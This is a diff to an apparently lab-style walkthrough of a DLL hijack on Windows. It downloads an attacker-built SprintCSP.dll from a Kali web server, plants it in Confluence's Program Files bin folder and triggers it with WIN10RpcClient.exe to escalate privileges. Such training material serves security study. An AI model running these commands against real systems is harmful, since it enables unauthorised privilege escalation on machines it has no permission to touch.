@@ -135,7 +135,49 @@ x86_64-w64-mingw32-g++ -shared -o SprintCSP.dll main.cpp
 
 > Now you have the .dll file. Transfer it to Windows:
 
+PS:
+
 ```powershell
-Invoke-WebRequest -Uri "http://172.16.220.130/SprintCSP.dll" -OutFile "C:\Users\Student\Desktop\SprintCSP.dll"
+Invoke-WebRequest -Uri "http://172.16.112.128/SprintCSP.dll" -OutFile "C:\Users\Student\Desktop\SprintCSP.dll"
+```
+
+> Kali
+
+```shell
+┌──(root㉿kali)-[/labs]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+172.16.112.130 - - [22/Jul/2026 08:21:49] "GET /SprintCSP.dll HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+```
+
+> Okay, we pulled the .dll file to victim Windows. Now let's copy it to /Confluence/bin, check the \bin directory, and run the .exe file to run the .dll file:
+
+```powershell
+PS C:\Users\Student\Downloads> Copy-Item ..\Desktop\SprintCSP.dll -Destination "C:\Program Files\Atlassian\Confluence\bin"
+
+#Confirm if it's there.
+
+PS C:\Users\Student\Downloads> dir "C:\Program Files\Atlassian\Confluence\bin"
+```
+
+---
+
+## Triggering the attacker controlled dll to escalate privileges
+
+```powershell
+PS C:\Users\Student\Downloads> dir
+Directory: C:\Users\Student\Downloads
+Mode LastWriteTime Length Name
+----                 -------------         ------ ----
+a----         7/18/2026  10:31 AM         121856 LocalPotato.exe
+-a----         7/18/2026   9:06 AM         238055 PrivescCheck.ps1
+-a----         7/18/2026   9:19 AM         279946 PrivescCheck_DESKTOP-V9578RL.html
+-a----         7/18/2026   9:19 AM         327514 PrivescCheck_DESKTOP-V9578RL.txt
+-a----         7/18/2026  10:11 AM          65536 SprintCSP.dll
+-a----         7/18/2026  10:12 AM         668160 WIN10RpcClient.exe
+PS C:\Users\Student\Downloads> .\WIN10RpcClient.exe
+[+] Dll hijack triggered! 
 ```
 
